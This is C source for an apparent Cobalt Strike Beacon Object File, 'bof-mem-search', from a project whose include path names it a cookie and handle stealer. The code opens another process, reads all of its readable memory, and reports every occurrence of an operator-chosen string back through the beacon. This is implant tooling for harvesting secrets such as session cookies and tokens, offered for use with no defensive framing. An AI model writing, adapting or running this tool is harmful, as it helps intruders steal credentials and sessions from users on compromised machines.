#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "../../Cookie-and-Handle-Stealer/beacon.h"

DECLSPEC_IMPORT int Kernel32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
DECLSPEC_IMPORT HANDLE Kernel32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT DWORD Kernel32$GetLastError();
DECLSPEC_IMPORT SIZE_T Kernel32$VirtualQueryEx(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
DECLSPEC_IMPORT BOOL Kernel32$ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
DECLSPEC_IMPORT BOOL Kernel32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT HANDLE Kernel32$GetProcessHeap();
DECLSPEC_IMPORT LPVOID Kernel32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT BOOL Kernel32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);

DECLSPEC_IMPORT int Msvcrt$iswprint(wint_t _C);
DECLSPEC_IMPORT int Msvcrt$memcmp(const void *_Buf1, const void *_Buf2, size_t _Size);
DECLSPEC_IMPORT size_t Msvcrt$strlen(const char *s);
DECLSPEC_IMPORT size_t Msvcrt$wcslen(const wchar_t *s);

static PVOID FindNonUnicodeChar(WCHAR *input) {
    while (*input) {
        if (!Msvcrt$iswprint(*input)) {
            return (PVOID)input;
        }
        input++;
    }
    return NULL;
}

static WCHAR* ConvertToWideChar(char *input) {
    WCHAR* output = NULL;
    SIZE_T outputLen = Kernel32$MultiByteToWideChar(CP_UTF8, 0, input, -1, NULL, 0);
    if (!outputLen) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error wchar conversion 1: %lu\n", Kernel32$GetLastError());
        return NULL;
    }
    output = (WCHAR *)Kernel32$HeapAlloc(Kernel32$GetProcessHeap(), HEAP_ZERO_MEMORY, (outputLen + 1) * sizeof(WCHAR));
    if (!output) {
        return NULL;
    }
    if (Kernel32$MultiByteToWideChar(CP_UTF8, 0, input, -1, output, (int)outputLen) == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error wchar conversion 2: %lu\n", Kernel32$GetLastError());
        Kernel32$HeapFree(Kernel32$GetProcessHeap(), 0, output);
        return NULL;
    }
    return output;
}

static void SearchMemory(HANDLE hProcess, char *search_string) {
    WCHAR *wsearch_string = ConvertToWideChar(search_string);
    if (!wsearch_string) {
        return;
    }
    MEMORY_BASIC_INFORMATION mbi;
    unsigned char *buffer;
    SIZE_T bytesRead;
    SIZE_T searchLen = Msvcrt$strlen(search_string);
    for (LPVOID addr = 0; Kernel32$VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi)) == sizeof(mbi); addr = (LPVOID)((SIZE_T)mbi.BaseAddress + mbi.RegionSize)) {
        if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE || mbi.Protect & PAGE_READONLY)) {
            buffer = (unsigned char *)Kernel32$HeapAlloc(Kernel32$GetProcessHeap(), HEAP_ZERO_MEMORY, mbi.RegionSize);
            if (!buffer) {
                continue;
            }
            if (Kernel32$ReadProcessMemory(hProcess, mbi.BaseAddress, buffer, mbi.RegionSize, &bytesRead)) {
                for (SIZE_T i = 0; i < bytesRead - searchLen; i++) {
                    if (Msvcrt$memcmp(buffer + i, search_string, searchLen) == 0) {
                        BeaconPrintf(CALLBACK_OUTPUT, "[c] Char string  (0x%p): %s\n", (PVOID)(buffer + i), (CHAR*)(buffer + i));
                    }
                    if (searchLen > 0 && Msvcrt$memcmp(buffer + i, wsearch_string, searchLen * 2) == 0) {
                        SIZE_T sizeOfStr = 0;
                        WCHAR *stringStart = (WCHAR*)(buffer + i);
                        PVOID stringEnd = FindNonUnicodeChar(stringStart);
                        if (stringEnd) {
                            sizeOfStr = (SIZE_T)((char *)stringEnd - (char *)stringStart);
                        } else {
                            sizeOfStr = Msvcrt$wcslen(stringStart) * 2;
                        }
                        WCHAR *finalString = (WCHAR *)Kernel32$HeapAlloc(Kernel32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeOfStr + 2);
                        if (finalString) {
                            for (SIZE_T j = 0; j < sizeOfStr; j++) {
                                ((char *)finalString)[j] = ((char *)stringStart)[j];
                            }
                            BeaconPrintf(CALLBACK_OUTPUT, "[w] Wchar string (0x%p): %S\n", (PVOID)(buffer + i), finalString);
                            Kernel32$HeapFree(Kernel32$GetProcessHeap(), 0, finalString);
                        }
                    }
                }
            }
            Kernel32$HeapFree(Kernel32$GetProcessHeap(), 0, buffer);
        }
    }
    Kernel32$HeapFree(Kernel32$GetProcessHeap(), 0, wsearch_string);
}

void go(char *args, int len) {
    datap parser;
    DWORD pid = 0;
    char *scanString = NULL;
    int scanLen = 0;
    HANDLE hProcess = NULL;

    if (len <= 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Usage: bof-mem-search --- <pid> <string>\n");
        return;
    }

    BeaconDataParse(&parser, args, len);
    pid = (DWORD)BeaconDataInt(&parser);
    scanString = BeaconDataExtract(&parser, &scanLen);
    if (pid == 0 || !scanString || !scanString[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Usage: bof-mem-search --- <pid> <string>\n");
        return;
    }

    hProcess = Kernel32$OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error opening process: %lu\n", Kernel32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Scanning process Id: %lu\n[*] Search string: '%s'\n-------------------------------\n", pid, scanString);
    SearchMemory(hProcess, scanString);
    Kernel32$CloseHandle(hProcess);
    BeaconPrintf(CALLBACK_OUTPUT, "-------------------------------\n[*] Search complete\n");
}
